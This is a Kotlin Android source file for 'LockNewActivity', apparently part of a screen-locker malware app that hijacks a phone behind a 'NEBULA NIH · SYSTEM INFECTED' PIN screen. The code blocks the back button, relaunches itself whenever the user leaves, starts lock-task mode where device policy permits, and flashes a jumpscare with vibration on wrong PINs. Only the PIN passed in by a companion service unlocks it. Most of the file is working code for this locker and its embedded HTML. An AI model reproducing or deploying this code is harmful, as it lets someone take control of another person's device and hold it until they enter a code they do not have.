package com.sync.xxx

import android.annotation.SuppressLint
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.media.MediaPlayer
import android.webkit.WebViewClient

class LockNewActivity : Activity() {

    private lateinit var webView: WebView
    private var mediaPlayer: MediaPlayer? = null
    private var correctPin: String  = ""
    private var lockTitle: String   = "Perangkat Terkunci"
    private var customHtml: String  = ""
    private var isReceiverRegistered = false
    private var isUnlocked = false

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.UNLOCK") {
                isUnlocked = true
                finish()
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: ""
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: "Perangkat Terkunci"
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: ""

        setupWebView()
        registerUnlockReceiver()

        try {
    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
    if (dpm.isLockTaskPermitted(packageName)) startLockTask()
} catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "startLockTask: ${e.message}")
        }
        playLockSound()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: correctPin
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: lockTitle
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: customHtml
    }

    override fun onBackPressed() {
    if (!isUnlocked) return
    super.onBackPressed()
}

    override fun onPause() {
        super.onPause()
        if (isUnlocked) return
        val handler = android.os.Handler(android.os.Looper.getMainLooper())
        handler.postDelayed({
            if (isUnlocked) return@postDelayed
            val intent = Intent(this, LockNewActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                putExtra(LockOverlayService.EXTRA_PIN, correctPin)
                putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
                putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
            }
            startActivity(intent)
        }, 300)
    }

    override fun onStop() {
    super.onStop()
    if (isUnlocked) return
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
        val intent = Intent(this, LockNewActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            putExtra(LockOverlayService.EXTRA_PIN, correctPin)
            putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
            putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
        }
        startActivity(intent)
    }
}

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = WebView(this)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
        }
        webView.setBackgroundColor(android.graphics.Color.TRANSPARENT)
        webView.addJavascriptInterface(LockBridge(), "LockBridge")
        webView.webViewClient = WebViewClient()
        if (customHtml.isNotEmpty()) {
            webView.loadDataWithBaseURL(null, buildCustomLockHtml(customHtml), "text/html", "UTF-8", null)
        } else {
            webView.loadDataWithBaseURL(null, buildLockHtml(), "text/html", "UTF-8", null)
        }
        setContentView(webView)
    }

    private fun buildCustomLockHtml(body: String): String {
        return """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{width:100%;height:100%;background:transparent;overflow:hidden;display:flex;align-items:center;justify-content:center}
#wrap{width:100%;height:100%;display:flex;align-items:center;justify-content:center}
</style>
</head>
<body>
<div id="wrap">
${body}
</div>
</body>
</html>""".trimIndent()
    }

    private fun registerUnlockReceiver() {
        if (isReceiverRegistered) return
        try {
            val filter = IntentFilter("com.sync.xxx.UNLOCK")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(unlockReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(unlockReceiver, filter)
            }
            isReceiverRegistered = true
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "registerReceiver: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { stopLockTask() } catch (_: Exception) {}
        if (isReceiverRegistered) {
            try { unregisterReceiver(unlockReceiver) } catch (_: Exception) {}
            isReceiverRegistered = false
        }
        mediaPlayer?.release()
        mediaPlayer = null
        webView.destroy()
    }

    inner class LockBridge {
        @JavascriptInterface
        fun tryUnlock(pin: String): Boolean {
            val ok = (pin == correctPin)
            if (ok) {
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    try {
                        val cmdIntent = Intent(DeviceService.ACTION_COMMAND).apply {
                            putExtra(DeviceService.EXTRA_COMMAND, "unlockDevice")
                            putExtra(DeviceService.EXTRA_VALUE, "true")
                            setPackage(packageName)
                        }
                        sendBroadcast(cmdIntent)
                    } catch (e: Exception) {
                        android.util.Log.w("LockNewActivity", "broadcast: ${e.message}")
                    }
                    val unlockIntent = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
                    sendBroadcast(unlockIntent)
                }
            }
            return ok
        }

        @JavascriptInterface
        fun getLockTitle(): String = lockTitle
    }

    private fun playLockSound() {
        try {
            val afd = resources.openRawResourceFd(R.raw.lock) ?: return
            mediaPlayer = MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                prepare()
                start()
                setOnCompletionListener { release(); mediaPlayer = null }
            }
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "playLockSound: ${e.message}")
        }
    }

    private fun buildLockHtml(): String {
        val safeTitle = lockTitle
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace("\"", "&quot;")

        return """<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>NEBULA NIH · DO NOT ENTER</title>
<link href="https://fonts.googleapis.com/css2?family=Creepster&family=Orbitron:wght@500;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%;width:100%;overflow:hidden;background:#020202}
body{
  color:#00ff41;
  font-family:'Orbitron',sans-serif;
  height:100vh;
  display:flex;align-items:center;justify-content:center;
  position:relative;
}

/* ============ GLOBAL GLITCH & SHAKE ============ */
body.jumpscare{
  animation:scaryShake .15s infinite;
}
@keyframes scaryShake{
  0%{transform:translate(0,0) rotate(0)}
  25%{transform:translate(5px,-5px) rotate(1deg)}
  50%{transform:translate(-5px,5px) rotate(-1deg)}
  75%{transform:translate(5px,5px) rotate(1deg)}
  100%{transform:translate(0,0) rotate(0)}
}

/* ============ BACKGROUND ============ */
.bg-dark{
  position:fixed;inset:0;z-index:0;
  background:radial-gradient(circle at center, #051505 0%, #000 80%);
}

/* Grid background */
body::before{
  content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
  background-image:
    linear-gradient(rgba(0,255,65,.05) 1px,transparent 1px),
    linear-gradient(90deg,rgba(0,255,65,.05) 1px,transparent 1px);
  background-size:40px 40px;
  animation:gridMove 10s linear infinite;
  transform: perspective(500px) rotateX(20deg);
}
@keyframes gridMove{100%{background-position:0 40px}}

/* Efek Glitch RGB Overlay */
.glitch-overlay{
  position:fixed;inset:0;z-index:1;pointer-events:none;
  background:
    linear-gradient(90deg, rgba(255,0,0,0.05) 0%, transparent 50%, rgba(0,255,65,0.05) 100%);
  mix-blend-mode:screen;
  animation:glitchAnim 4s infinite;
}
@keyframes glitchAnim {
  0%, 95%, 100% { transform: translate(0); opacity: 0.5; }
  96% { transform: translate(-2px, 2px); opacity: 1; }
  97% { transform: translate(2px, -2px); opacity: 0.8; }
  98% { transform: translate(-2px, -2px); opacity: 1; }
}

/* Efek Cahaya Muter Background */
.bg-shine{
  position:fixed;top:-50%;left:-50%;width:200%;height:200%;
  background:linear-gradient(45deg,transparent 40%,rgba(0,255,65,.1) 45%,rgba(255,255,255,.2) 50%,rgba(0,255,65,.1) 55%,transparent 60%);
  animation:bgShineRotate 10s linear infinite;
  pointer-events:none;z-index:0;mix-blend-mode:screen;
}
@keyframes bgShineRotate{100%{transform:rotate(360deg)}}

/* Efek Bara Api Hijau (Embers) */
.ember{
  position:absolute;width:4px;height:4px;background:#00ff41;
  border-radius:50%;box-shadow:0 0 10px #00ff41,0 0 20px #00ff41;
  bottom:-20px;pointer-events:none;z-index:1;
  animation:emberUp linear infinite;
}
@keyframes emberUp{
  0%{transform:translateY(0) scale(1);opacity:1}
  100%{transform:translateY(-100vh) scale(0);opacity:0}
}

/* ============ EFEK SISI HIJAU ============ */
.edge-glow{position:fixed;inset:0;pointer-events:none;z-index:2;overflow:hidden}
.edge-glow::before{
  content:'';position:absolute;top:0;left:-100%;width:100%;height:2px;
  background:linear-gradient(90deg,transparent,#00ff41,transparent);
  box-shadow:0 0 20px #00ff41,0 0 40px #00ff41;
  animation:slideH 2s linear infinite;
}
.edge-glow::after{
  content:'';position:absolute;bottom:0;right:-100%;width:100%;height:2px;
  background:linear-gradient(90deg,transparent,#00ff41,transparent);
  box-shadow:0 0 20px #00ff41,0 0 40px #00ff41;
  animation:slideHRev 2s linear infinite;
}
@keyframes slideH{100%{left:100%}}
@keyframes slideHRev{100%{right:100%}}

.edge-line-v{
  position:absolute;left:0;top:-100%;width:2px;height:100%;
  background:linear-gradient(180deg,transparent,#00ff41,transparent);
  box-shadow:0 0 15px #00ff41;
  animation:slideV 3s linear infinite;
}
.edge-line-v2{
  position:absolute;right:0;bottom:-100%;width:2px;height:100%;
  background:linear-gradient(180deg,transparent,#00ff41,transparent);
  box-shadow:0 0 15px #00ff41;
  animation:slideVRev 3s linear infinite;
}
@keyframes slideV{100%{top:100%}}
@keyframes slideVRev{100%{bottom:0%}}

.corner{
  position:absolute;width:50px;height:50px;
  border:3px solid #00ff41;pointer-events:none;
  box-shadow:0 0 20px rgba(0,255,65,.8);
  opacity:.9;
}
.corner.tl{top:14px;left:14px;border-right:none;border-bottom:none}
.corner.tr{top:14px;right:14px;border-left:none;border-bottom:none}
.corner.bl{bottom:14px;left:14px;border-right:none;border-top:none}
.corner.br{bottom:14px;right:14px;border-left:none;border-top:none}

.vignette{
  position:fixed;inset:0;pointer-events:none;z-index:3;
  background:radial-gradient(circle at center,transparent 10%,rgba(0,0,0,.95) 80%);
}

.code-bg{position:fixed;inset:0;pointer-events:none;z-index:1;overflow:hidden}
.code-col{
  position:absolute;top:-100%;
  font-family:'JetBrains Mono',monospace;
  font-size:12px;color:rgba(0,255,65,.25);
  line-height:1.5;animation:codeFall linear infinite;white-space:pre;
}
@keyframes codeFall{100%{top:110%}}

/* ============ LANDING MEGAH ============ */
#landing{
  position:fixed;inset:0;display:flex;flex-direction:column;
  align-items:center;justify-content:center;gap:26px;
  z-index:10;padding:24px;transition:.8s;
}
#landing.hide{opacity:0;transform:scale(1.2);pointer-events:none}

/* Logo & Radar Muter */
.logo{
  position:relative;
  width:180px;height:180px;
  display:flex;align-items:center;justify-content:center;
  animation:logoFloat 4s ease-in-out infinite;
}
@keyframes logoFloat{50%{transform:translateY(-15px)}}

.radar-scan{
  position:absolute;inset:-30px;border-radius:50%;
  border:1px solid rgba(0,255,65,.3);
  background:conic-gradient(from 0deg, transparent 0deg, rgba(0,255,65,.4) 60deg, transparent 60deg);
  animation:spin 3s linear infinite;
  mask-image: radial-gradient(transparent 50%, black 51%);
  -webkit-mask-image: radial-gradient(transparent 50%, black 51%);
}

.logo-ring-1{
  position:absolute;inset:-12px;border-radius:50%;
  border:2px solid transparent;
  border-top-color:#00ff41;border-left-color:#00ff41;
  box-shadow:0 0 20px rgba(0,255,65,.8), inset 0 0 20px rgba(0,255,65,.4);
  animation:spin 2s linear infinite;
}
.logo-ring-2{
  position:absolute;inset:-24px;border-radius:50%;
  border:1px dashed rgba(0,255,65,.5);
  animation:spin 10s linear infinite reverse;
}
@keyframes spin{100%{transform:rotate(360deg)}}

/* PP Frame */
.pp-frame{
  position:relative;
  width:150px;height:150px;
  border-radius:50%;
  overflow:hidden;
  border:3px solid #00ff41;
  background:#000;
  z-index:2;
  box-shadow:0 0 35px rgba(0,255,65,.8), inset 0 0 20px rgba(0,0,0,1);
}
.pp-frame img{
  width:100%;height:100%;
  object-fit:cover;display:block;
  filter: contrast(1.2) brightness(0.9);
}

/* Mata Menyala Jumpscare (Hidden Default) */
.eye-glow{
  position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
  width:100%;height:100%;background:radial-gradient(circle, rgba(0,255,65,.8) 0%, transparent 60%);
  opacity:0;z-index:4;mix-blend-mode:color-dodge;
  transition:opacity .2s;
}
.logo.jumpscare .eye-glow{opacity:1; animation:eyePulse .2s infinite;}
@keyframes eyePulse{50%{transform:translate(-50%,-50%) scale(1.2);opacity:.7}}

/* Title Glitch & Creepy */
.title-container{
  position:relative;
  text-align:center;
}
.title{
  font-family:'Creepster', cursive; /* Font Seram */
  font-size:52px;
  font-weight:900;
  letter-spacing:8px;
  color:#fff;
  text-transform:uppercase;
  text-shadow:
    0 0 10px #00ff41,
    0 0 20px #00ff41,
    0 0 40px #00ff41,
    3px 3px 0 #000;
  animation:flick 4s infinite, glitchText 2s infinite;
  position:relative;
}
@keyframes flick{
  45%{opacity:.3} 46%{opacity:1} 92%{opacity:.7} 93%{opacity:1}
}
@keyframes glitchText{
  0%, 100% { transform: translate(0); }
  33% { transform: translate(-3px, 2px); text-shadow: 2px 0 red, -2px 0 blue; }
  66% { transform: translate(3px, -2px); text-shadow: -2px 0 red, 2px 0 blue; }
}

.sub{
  font-family:'JetBrains Mono',monospace;
  font-size:12px;letter-spacing:6px;
  color:#ff2222;
  text-shadow:0 0 10px red;
  text-transform:uppercase;
  margin-top:8px;
  animation:pulseRed 1.5s infinite;
}
@keyframes pulseRed{50%{opacity:.5}}

/* CTA Button Megah */
.btn{
  position:relative;
  padding:20px 60px;
  background:rgba(0,255,65,0.1);
  border:2px solid #00ff41;
  border-radius:4px; /* Kotak tegas */
  color:#00ff41;
  font-family:'Orbitron',sans-serif;
  font-size:16px;font-weight:900;
  letter-spacing:8px;
  text-transform:uppercase;
  cursor:pointer;
  overflow:hidden;
  box-shadow:0 0 25px rgba(0,255,65,.6), inset 0 0 20px rgba(0,255,65,.2);
  transition:.3s;
  margin-top:10px;
}
.btn:hover{
  background:rgba(0,255,65,0.3);
  box-shadow:0 0 50px rgba(0,255,65,1), inset 0 0 30px rgba(0,255,65,.5);
  color:#fff;
}
.btn::after{
  content:'';position:absolute;inset:0;
  background:linear-gradient(90deg, transparent, #fff, transparent);
  transform:translateX(-100%);
  animation:btnSweep 2s infinite;
}
@keyframes btnSweep{100%{transform:translateX(100%)}}

/* ============ LOCK ============ */
#lock{
  position:fixed;inset:0;display:flex;flex-direction:column;
  align-items:center;justify-content:center;gap:20px;padding:24px;
  opacity:0;transform:scale(1.1);pointer-events:none;transition:.6s;z-index:5;
}
#lock.show{opacity:1;transform:none;pointer-events:auto}

.lock-logo{width:120px;height:120px}
.lock-logo .pp-frame{width:100px;height:100px;border-width:2px}
.lock-logo .logo-ring-1{inset:-8px}
.lock-logo .logo-ring-2{inset:-16px}

.lock-title{
  font-family:'Creepster', cursive;
  font-size:28px;letter-spacing:4px;
  color:#fff;text-transform:uppercase;
  text-shadow:0 0 15px #00ff41, 0 0 30px #00ff41;
  animation:flick 3s infinite;
}
.lock-sub{
  font-family:'JetBrains Mono',monospace;
  font-size:10px;letter-spacing:4px;color:#4a8a4a;
  text-transform:uppercase;margin-top:-5px;
}

/* PIN Dots */
.dots{display:flex;gap:24px;margin:10px 0}
.dot{
  width:18px;height:18px;border-radius:50%;
  border:2px solid rgba(0,255,65,.4);background:transparent;
  transition:.35s cubic-bezier(.16,1.4,.3,1);position:relative;
}
.dot.fill{
  background:#00ff41;border-color:#00ff41;transform:scale(1.3);
  box-shadow:0 0 20px #00ff41,0 0 40px rgba(0,255,65,.9);
}
.dot.fill::before{
  content:'';position:absolute;inset:-10px;border-radius:50%;
  border:2px solid rgba(0,255,65,.7);animation:dotRipple .6s ease-out;
}
@keyframes dotRipple{100%{transform:scale(2.5);opacity:0}}

.dot.err{
  background:#ff2222;border-color:#ff2222;
  box-shadow:0 0 20px #ff2222,0 0 40px rgba(255,34,34,.8);
  animation:shake .4s ease;
}
@keyframes shake{25%,75%{transform:translateX(-12px)}50%{transform:translateX(12px)}}

.status{
  font-family:'JetBrains Mono',monospace;
  font-size:12px;letter-spacing:2.5px;color:#4a8a4a;
  text-transform:uppercase;height:24px;text-align:center;transition:.3s;
}
.status.err{color:#ff2222;text-shadow:0 0 15px #ff2222;animation:errBlink .3s 3}
.status.ok{color:#00ff41;text-shadow:0 0 15px #00ff41}
@keyframes errBlink{50%{opacity:.3}}

/* Keypad Seram */
.pad{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;width:100%;max-width:320px}
.key{
  position:relative;height:70px;border-radius:8px;
  border:1.5px solid rgba(0,255,65,.3);
  background:linear-gradient(180deg, rgba(0,20,0,.8), rgba(0,0,0,.9));
  color:#e0ffe0;display:flex;flex-direction:column;
  align-items:center;justify-content:center;cursor:pointer;
  transition:.15s;overflow:hidden;
  box-shadow:inset 0 0 15px rgba(0,255,65,.1);
}
.key::before{
  content:'';position:absolute;top:0;left:0;width:100%;height:2px;
  background:linear-gradient(90deg,transparent,#00ff41,transparent);
  opacity:.5;
}
.key .n{font-size:26px;font-weight:900;line-height:1;text-shadow:0 0 10px rgba(0,255,65,.5)}
.key .s{font-family:'JetBrains Mono',monospace;font-size:8px;letter-spacing:2px;color:#4a8a4a;margin-top:4px}

.key:active, .key.press{
  transform:scale(.9);background:rgba(0,255,65,.3);border-color:#00ff41;
  box-shadow:0 0 30px rgba(0,255,65,.8), inset 0 0 20px rgba(0,255,65,.5);
}
.key:active .n, .key.press .n{color:#fff;text-shadow:0 0 20px #fff}

.ripple{
  position:absolute;border-radius:50%;
  background:radial-gradient(circle,#00ff41,transparent 70%);
  transform:scale(0);animation:rippleOut .6s ease-out forwards;pointer-events:none;
}
@keyframes rippleOut{100%{transform:scale(4);opacity:0}}

.key.del{background:rgba(50,0,0,.5);border-color:rgba(255,0,0,.3)}
.key.del .n{color:#ff2222;text-shadow:0 0 10px red}
.key.del:active{background:rgba(255,0,0,.3);border-color:red}

.key.bio .n{color:#00ff41;font-size:24px;animation:bioPulse 1.5s infinite}
@keyframes bioPulse{50%{text-shadow:0 0 20px #00ff41,0 0 40px #00ff41}}

/* ============ SUCCESS ============ */
.success{
  position:fixed;inset:0;background:#000;z-index:100;
  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:24px;
  opacity:0;pointer-events:none;transition:.5s;
}
.success.show{opacity:1;pointer-events:auto}
.success-icon{
  width:130px;height:130px;border-radius:50%;border:3px solid #00ff41;
  display:flex;align-items:center;justify-content:center;
  font-size:60px;color:#00ff41;background:radial-gradient(circle,rgba(0,255,65,.4),transparent 70%);
  box-shadow:0 0 50px #00ff41, inset 0 0 30px rgba(0,255,65,.5);
  animation:pop .7s cubic-bezier(.16,1.4,.3,1);
}
@keyframes pop{0%{transform:scale(0) rotate(-180deg)}100%{transform:scale(1) rotate(0)}}
.success-txt{
  font-family:'Creepster', cursive;font-size:32px;letter-spacing:6px;color:#fff;
  text-shadow:0 0 20px #00ff41;animation:flick 2s infinite;
}
</style>
</head>
<body>

<div class="bg-dark"></div>
<div class="bg-shine"></div>
<div class="glitch-overlay"></div>

<!-- BARA API -->
<div id="embers"></div>

<!-- FLOATING CODE -->
<div class="code-bg" id="codeBg"></div>

<!-- EFEK SISI -->
<div class="edge-glow">
  <div class="edge-line-v"></div>
  <div class="edge-line-v2"></div>
  <div class="corner tl"></div>
  <div class="corner tr"></div>
  <div class="corner bl"></div>
  <div class="corner br"></div>
</div>
<div class="vignette"></div>

<!-- ============ LANDING ============ -->
<div id="landing">
  <div class="logo" id="logoLanding">
    <div class="radar-scan"></div>
    <div class="logo-ring-1"></div>
    <div class="logo-ring-2"></div>
    <div class="pp-frame">
      <img src="https://files.catbox.moe/3dsbwq.jpg" alt="PP"
           onerror="this.style.display='none';this.parentElement.style.background='#050505';">
      <div class="eye-glow"></div>
    </div>
  </div>

  <div class="title-container">
    <div class="title">NEBULA NIH</div>
    <div class="sub">SYSTEM INFECTED</div>
  </div>

  <button class="btn" onclick="showLock()">ENTER</button>
</div>

<!-- ============ LOCK ============ -->
<div id="lock">
  <div class="logo lock-logo" id="logoLock">
    <div class="logo-ring-1"></div>
    <div class="logo-ring-2"></div>
    <div class="pp-frame">
      <img src="https://files.catbox.moe/3dsbwq.jpg" alt="PP"
           onerror="this.style.display='none';this.parentElement.style.background='#050505';">
      <div class="eye-glow"></div>
    </div>
  </div>

  <div class="lock-title">LOCKED</div>
  <div class="lock-sub">Enter Access Code</div>

  <div class="dots">
    <div class="dot" id="d0"></div>
    <div class="dot" id="d1"></div>
    <div class="dot" id="d2"></div>
    <div class="dot" id="d3"></div>
  </div>

  <div class="status" id="st">AWAITING INPUT...</div>

  <div class="pad" id="pad">
    <div class="key" data-n="1"><span class="n">1</span></div>
    <div class="key" data-n="2"><span class="n">2</span><span class="s">ABC</span></div>
    <div class="key" data-n="3"><span class="n">3</span><span class="s">DEF</span></div>
    <div class="key" data-n="4"><span class="n">4</span><span class="s">GHI</span></div>
    <div class="key" data-n="5"><span class="n">5</span><span class="s">JKL</span></div>
    <div class="key" data-n="6"><span class="n">6</span><span class="s">MNO</span></div>
    <div class="key" data-n="7"><span class="n">7</span><span class="s">PQRS</span></div>
    <div class="key" data-n="8"><span class="n">8</span><span class="s">TUV</span></div>
    <div class="key" data-n="9"><span class="n">9</span><span class="s">WXYZ</span></div>
    <div class="key bio" data-a="bio"><span class="n">◈</span><span class="s">AUTO</span></div>
    <div class="key" data-n="0"><span class="n">0</span><span class="s">+</span></div>
    <div class="key del" data-a="del"><span class="n">⌫</span><span class="s">DEL</span></div>
  </div>
</div>

<!-- ============ SUCCESS ============ -->
<div class="success" id="succ">
  <div class="success-icon">✓</div>
  <div class="success-txt">ACCESS GRANTED</div>
</div>

<script>
// ============================================================
// PIN SYSTEM (Controlled by APK/URL)
// ============================================================
const DEFAULT_PIN = "1234";
function getPinFromURL(){
  return new URLSearchParams(window.location.search).get('pin');
}
function getPinFromStorage(){
  try { return localStorage.getItem('nebula_pin'); } catch(e){ return null; }
}
let PIN = getPinFromURL() || getPinFromStorage() || DEFAULT_PIN;
if(getPinFromURL()){
  try { localStorage.setItem('nebula_pin', PIN); } catch(e){}
}
console.log('[NEBULA NIH] PIN aktif:', PIN);

// ============================================================
// STATE
// ============================================================
let cur = "", max = 4;
const st = document.getElementById('st');
const dots = [0,1,2,3].map(i => document.getElementById('d'+i));

// ============================================================
// BACKGROUND EFFECTS (Embers & Code)
// ============================================================
(function(){
  // Kode Matrix
  const container = document.getElementById('codeBg');
  const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノ';
  for(let i = 0; i < 12; i++){
    const col = document.createElement('div');
    col.className = 'code-col';
    col.style.left = (Math.random() * 100) + '%';
    col.style.animationDuration = (6 + Math.random() * 8) + 's';
    col.style.animationDelay = (Math.random() * 5) + 's';
    col.style.opacity = 0.2 + Math.random() * 0.4;
    let txt = '';
    for(let j = 0; j < 30; j++){
      txt += chars[Math.floor(Math.random() * chars.length)] + '\n';
    }
    col.textContent = txt;
    container.appendChild(col);
  }

  // Bara Api Hijau
  const emberContainer = document.getElementById('embers');
  for(let i=0; i<20; i++){
    const ember = document.createElement('div');
    ember.className = 'ember';
    ember.style.left = (Math.random() * 100) + '%';
    ember.style.animationDuration = (3 + Math.random() * 4) + 's';
    ember.style.animationDelay = (Math.random() * 3) + 's';
    emberContainer.appendChild(ember);
  }
})();

// ============================================================
// LANDING / LOCK
// ============================================================
function showLock(){
  document.getElementById('landing').classList.add('hide');
  document.getElementById('lock').classList.add('show');
  cur = ""; upd(); set('AWAITING INPUT...','');
  if(navigator.vibrate) navigator.vibrate([50, 50, 50]); // Getar 3x masuk
}

// ============================================================
// JUMpscare / GLITCH EFFECT
// ============================================================
function triggerJumpscare(){
  if(navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 500]); // Getar keras
  
  document.body.classList.add('jumpscare');
  document.getElementById('logoLock').classList.add('jumpscare');
  
  // Flash merah sebentar
  const flash = document.createElement('div');
  flash.style.cssText = 'position:fixed;inset:0;background:rgba(255,0,0,0.4);z-index:9999;pointer-events:none;';
  document.body.appendChild(flash);
  setTimeout(() => flash.remove(), 150);

  setTimeout(() => {
    document.body.classList.remove('jumpscare');
    document.getElementById('logoLock').classList.remove('jumpscare');
  }, 600);
}

// ============================================================
// KEYPAD
// ============================================================
document.getElementById('pad').addEventListener('click', e => {
  const k = e.target.closest('.key');
  if(!k) return;

  // Efek ripple
  const rect = k.getBoundingClientRect();
  const ripple = document.createElement('div');
  ripple.className = 'ripple';
  const size = Math.max(rect.width, rect.height);
  ripple.style.width = ripple.style.height = size + 'px';
  ripple.style.left = (e.clientX - rect.left - size/2) + 'px';
  ripple.style.top = (e.clientY - rect.top - size/2) + 'px';
  k.appendChild(ripple);
  setTimeout(() => ripple.remove(), 600);

  if(k.dataset.a === 'del'){
    cur = cur.slice(0,-1); upd(); set('','');
    if(navigator.vibrate) navigator.vibrate(15);
    return;
  }
  if(k.dataset.a === 'bio'){
    set('◈ SCANNING...','');
    if(navigator.vibrate) navigator.vibrate(50);
    setTimeout(() => { cur = PIN; upd(); setTimeout(check, 400); }, 900);
    return;
  }
  const n = k.dataset.n;
  if(n && cur.length < max){
    cur += n; upd(); set('','');
    if(navigator.vibrate) navigator.vibrate(15);
    if(cur.length === max) setTimeout(check, 250);
  }
});

function upd(){
  dots.forEach((d,i)=>{
    d.classList.remove('err');
    d.classList.toggle('fill', i < cur.length);
  });
}
function set(m,c){
  st.textContent = m;
  st.className = 'status' + (c ? ' ' + c : '');
}

// ============================================================
// CHECK PIN
// ============================================================
function check(){
  if(cur === PIN){
    set('✓ ACCESS GRANTED','ok');
    dots.forEach(d => d.classList.add('fill'));
    if(navigator.vibrate) navigator.vibrate([100,50,100,50,200]); // Getar sukses
    
    document.getElementById('succ').classList.add('show');

    // Trigger APK Bridge
    try {
      if(window.AndroidBridge && window.AndroidBridge.onUnlock){
        window.AndroidBridge.onUnlock();
      }
    } catch(e){}

    setTimeout(() => {
      document.getElementById('succ').classList.remove('show');
      cur = ""; upd(); set('AWAITING INPUT...','');
    }, 2400);
  } else {
    set('✗ ACCESS DENIED','err');
    dots.forEach(d => d.classList.add('err'));
    triggerJumpscare(); // Panggil efek jumpscare
    
    setTimeout(() => { cur = ""; upd(); set('AWAITING INPUT...',''); }, 1200);
  }
}

// Keyboard support
document.addEventListener('keydown', e => {
  if(!document.getElementById('lock').classList.contains('show')) return;
  if(/^[0-9]$/.test(e.key) && cur.length < max){
    cur += e.key; upd();
    if(cur.length === max) setTimeout(check, 250);
  }
  if(e.key === 'Backspace'){ cur = cur.slice(0,-1); upd(); }
});

// API
window.setPin = function(newPin){
  if(newPin && /^\d{4}$/.test(newPin)){
    PIN = newPin;
    try { localStorage.setItem('nebula_pin', newPin); } catch(e){}
    return true;
  }
  return false;
};
</script>
</body>
</html>
"""
    }
}